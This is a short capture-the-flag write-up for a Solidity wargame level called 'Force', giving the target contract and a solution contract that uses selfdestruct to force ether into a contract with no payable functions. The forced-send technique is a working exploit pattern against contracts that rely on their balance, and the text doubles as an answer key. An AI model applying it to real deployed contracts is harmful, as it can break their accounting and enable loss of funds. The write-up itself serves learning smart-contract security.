# Level 7 - Force

### Objective

The objective of this level is as follows:

1. Make the balance of the contract greater than zero

### Contract

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

### Solution

In this level, we cannot simply transfer ether into the contract since there are no functions or fallback methods. Thus, we must take advantage of the `selfdestruct` function in an intermediate contract `MiddleMan` which will allow us to send all of the funds from `MiddleMan` to `Force`:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract MiddleMan {

    function deposit() public payable returns(uint) {
        return address(this).balance;
    }

    function destroy() public {
        address payable addr = // insert instance address here;
        selfdestruct(addr);
    }

}
```

First, we deposit some number of ether into `MiddleMan` via `deposit()`. Next, we self-destruct `MiddleMan` via `destroy()` which transfers all of the funds we deposited in `MiddleMan` to `Force`.

Finally, verify that the level instance has a balance greater than zero:

```
await getBalance(contract.address)

```

Done!
